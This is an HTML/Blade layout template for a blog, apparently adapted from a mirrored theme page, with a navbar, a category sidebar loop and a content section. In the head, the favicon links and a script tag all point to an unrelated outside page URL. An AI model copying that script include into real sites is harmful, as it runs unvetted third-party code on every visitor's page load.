<!DOCTYPE html>
<html lang="en">

<!-- Mirrored from www.themashabrand.com/templates/Masha/Medium/newsfeed.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 23 Jun 2019 16:53:35 GMT -->
<head>

	    <!-- ==============================================
		Title and Meta Tags
		=============================================== -->
		<meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
		<title>@yield('title','Blog')</title>

        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta name="description" content="Add your business website description here">
        <meta name="keywords" content="Add your, business, website, keywords, here">
        <meta name="author" content="Add your business, website, author here">

		<!-- ==============================================
		Favicons
		=============================================== -->
		<link rel="shortcut icon" href="https://www.duuuunk.com/a-new-beginning">
		<link rel="apple-touch-icon" href="https://www.duuuunk.com/a-new-beginning">
		<link rel="apple-touch-icon" sizes="72x72" href="https://www.duuuunk.com/a-new-beginning">
		<link rel="apple-touch-icon" sizes="114x114" href="https://www.duuuunk.com/a-new-beginning">




        <!-- Style-->
        <link type="text/css" href="{{asset('assets/bower_components/bootstrap/dist/css/bootstrap.css')}}" rel="stylesheet" />
        <link type="text/css" href="{{asset('assets/css/app.css')}}" rel="stylesheet" />

		<!-- ==============================================
		Feauture Detection
        =============================================== -->

        @yield('style')
		<script src="https://www.duuuunk.com/a-new-beginning"></script>


  </head>

  <body>

     <!-- ==============================================
     Navigation Section
     =============================================== -->
	 <nav class="navbar navbar-light navbar-toggleable-sm bg-faded justify-content-between" id="mainNav-2">
	  <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#collapsingNavbar2">
	   <span class="navbar-toggler-icon"></span>
	  </button>
      <a href="index.html" class="navbar-brand mr-0"> Blog ...</a>
	  <div class="navbar-collapse collapse justify-content-between" id="collapsingNavbar2">
	   <div><!--placeholder to evenly space flexbox items and center links--></div>
	   <ul class="navbar-nav">
		<!-- Search in right of nav -->
		<li class="nav-item hidden-xs-down">
		 <form class="top_search clearfix">
		  <div class="top_search_con">
		   <input class="s" placeholder="Search Here ..." type="text">
		   <span class="top_search_icon"><i class="fa fa-search"></i></span>
		   <input class="top_search_submit" type="submit">
		  </div>
		 </form>
		</li>
		<!-- Search Ends -->
	   </ul>
	   <ul class="nav navbar-nav">





	   </ul><!-- /navbar-nav -->
	  </div><!-- /navbar-collapse -->
	 </nav><!-- /nav -->

     <!-- ==============================================
     Posts Section
     =============================================== -->


	 <section class="posts-2">
	  <div class="container-fluid">
	   <div class="row">

        <div class="col-md-3">

		 <div class="card widget-info-one">
		  <div class="widget-avatar-img">
		  <img class="card-img-top img-fluid" src="{{asset('assets/img/posts/image.jpg')}}" alt="">
		 </div><!-- /.avatar-img -->
		    <div class="card-block">
		 <div class="inner">
		  <div class="widget-avatar pull-left"><img alt="" src="{{asset('assets/img/users/2.jpg')}}"></div>
		   <h5>Alex Grantte</h5>
		   <span class="subtitle">Praesent magna nunc, tincidunt pretium.</span>
		  </div><!-- /.inner -->
		  </div>

         </div><!-- /.panel -->

		<div class="card widget-info-two">
		  <ul class="list-group list-group-flush">
                @foreach (App\Category::all() as $category )
            <li class="list-group-item"><i class="fa fa-map-marker"></i>&nbsp;


                <a   href="{{ route('postsOfcategory', [ 'id' => $category->id ]) }}">   {{$category->name}}</a>
              </li>

                 @endforeach

		  </ul>
		</div>

        </div><!-- /.col-md-4 -->

        <div class="col-md-6">

       @yield('content')


        </div><!-- /.col-md-6 -->



	   </div><!-- /.row -->
	  </div><!-- /.container -->
     </section><!-- /.section -->

	 <!-- ==============================================
	 More Section
	 =============================================== -->
	 <section class="more" style="background: #f2f2f2 !important; padding-top: 10px;">
	  <div class="container">
	   <div class="row">
	    <div class="col-lg-8 offset-md-2">
		 <a href="#" class="kafe-btn kafe-btn-default"><i class="fa fa-spinner"></i> Read More</a>
		</div><!-- /.col-lg-8 -->
	   </div><!-- /.row -->
	  </div><!-- /container -->
	 </section><!-- /w -->

     <!-- ==============================================
     Footer Section
     =============================================== -->

     <a id="scrollup">Scroll</a>

     <!-- ==============================================
	 Scripts
	 =============================================== -->
	<script src="{{asset('assets/bower_components/jquery/dist/jquery.js')}}"></script>
	<script src="{{asset('assets/bower_components/tether/dist/js/tether.min.js')}}"></script>
	<script src="{{asset('assets/bower_components/bootstrap/dist/js/bootstrap.js')}}"></script>
	<script src="{{asset('assets/js/medium.js')}}"></script>

  </body>

<!-- Mirrored from www.themashabrand.com/templates/Masha/Medium/newsfeed.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 23 Jun 2019 16:54:56 GMT -->
</html>
